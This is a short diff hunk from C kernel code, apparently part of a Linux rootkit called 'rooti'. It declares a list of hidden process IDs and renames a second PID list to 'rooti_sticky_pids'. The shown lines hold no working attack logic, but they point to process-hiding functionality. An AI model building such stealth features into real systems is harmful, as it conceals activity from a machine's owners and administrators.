@@ -6,7 +6,7 @@
 
 DEFINE_MUTEX(rooti_state_mutex);
 LIST_HEAD(rooti_hidden_pids);
-LIST_HEAD(rooti_lifetime_bound_pids);
+LIST_HEAD(rooti_sticky_pids);
 
 int rooti_pid_list_add(pid_t pid, struct list_head *list)
 {
